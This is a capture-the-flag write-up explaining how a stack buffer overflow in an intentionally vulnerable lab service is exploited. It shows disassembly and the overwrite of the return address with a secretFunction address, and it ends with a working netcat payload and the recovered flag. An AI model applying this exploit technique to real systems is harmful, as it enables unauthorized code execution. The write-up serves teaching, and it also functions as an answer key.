**Name**: Smash the Stack  
**Points**: 250  
**Instructions**: Exploit the vulnerable [smash-the-stack](https://challenges.runesec.com/static/322479ef49ce2bf103e538e898de875a/smash-the-stack) service running at challenges.runesec.com:29761.  
**Hint**: It's a secret!  

## Exploration
- The name of this challenge suggests the service provided is vulnerable to buffer overflow attacks.

- Usually this is a result of using memory manipulation functions that don't take the length of the input into consideration. For example, `strcpy()` instead of `strncpy()`, `strcat()` instead of `strncat()`, etc.

- We open the file in radare2. `main` calls a function named `echo`. It asks for our input.

- `echo` reads our input in a 28-bytes long buffer
```
0x080485dc  68eb860408  push str.Enter_some_text: ; str.Enter_some_text: ; "Enter some text:" @ 0x80486eb
0x080485e1  e81afeffff  call sym.imp.puts         ;[1]
0x080485e6  83c410      add esp, 0x10
0x080485e9  83ec08      sub esp, 8
0x080485ec  8d45e4      lea eax, [ebp - 0x1c]     ;[2]
```
*0x1c in hexadecimal is 28 in decimal*  

- We also notice a function named `secretFunction` which makes a call to the system to open `file.txt`. We need to call that function.

- Calling that function is trivial with the help of gdb on our machine. But, obviously, there's no `flag.txt` on our machine. 

- We need to somehow give a crafted input to the online service that will make it call `secretFunction` and give us the flag.

- Maybe we can overwrite the return address of `echo` and make it return the flow to `secretFunction`, instead of back to main.

- `secretFunction` is at address `0x0804856b`.

## Exploitation
- Since our input will only stop being copied in the buffer until a null terminator is found, we can give an input as long as we desire.  

- We know that anything beyond 28 bytes - the maximum length expected - has free reign on other memory spaces that follow.  
After the buffer, theres a Saved Frame Pointer and then the Return Address Pointer.  
```
buffer                        sfp   ret  
[             28             ][ 4  ][ 4  ]
```

- Pointers in 32-bit architectures are 4 bytes long.

- Return Address Pointer holds the address that the function was called from so it knows where to, well, return. We can overwrite that address space with our crafted input so it contains the address of `secretFunction`.
```
buffer                        sfp   ret 
[aaaaaaaaaaaaaaaaaaaaaaaaaaaa][aaaa][\x6b\x85\x04\x08]
```

#### Solution
```
$ echo -e "`printf 'a%.0s' {1..32}`\x6b\x85\x04\x08" | nc challenges.runesec.com 29761
Enter some text:
You entered: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaakï¿½
y0u f0unD the s3cr3t fuNcti0n!
flag{4a354d3c8d8779a9b57430c028e1a390}
```